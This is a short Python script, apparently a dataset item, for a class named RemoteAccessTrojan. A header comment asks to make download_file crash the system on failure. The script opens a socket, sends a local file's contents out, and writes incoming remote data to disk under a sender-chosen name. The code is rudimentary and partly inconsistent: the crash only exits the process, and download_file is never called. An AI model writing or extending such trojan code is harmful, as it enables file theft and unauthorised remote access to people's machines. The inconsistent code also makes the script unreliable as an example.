# modify the download_file function to crash the system when it fails to download a file.

import socket
import os
import sys

class File:
    def __init__(self, path):
        self.path = path

def upload_file(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
        print(f"Uploading file: {file_path}")
        return data

def download_file(sock):
    try:
        data = sock.recv(1024)
        if not data:
            raise Exception("Failed to download file")
        filename = os.path.basename(data.decode('utf-8'))
        with open(filename, 'wb') as f:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        print(f"Downloading file: {filename}")
        return filename
    except Exception as e:
        print("Failed to download file:", e)
        os._exit(1)

class RemoteAccessTrojan:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        return sock

def main():
    host = 'localhost'
    port = 12345

    # Upload file
    sock = RemoteAccessTrojan(host, port).connect()
    file_path = "C:\\path\\to\\file.txt"
    data = upload_file(file_path)
    sock.send(data)

if __name__ == "__main__":
    main()
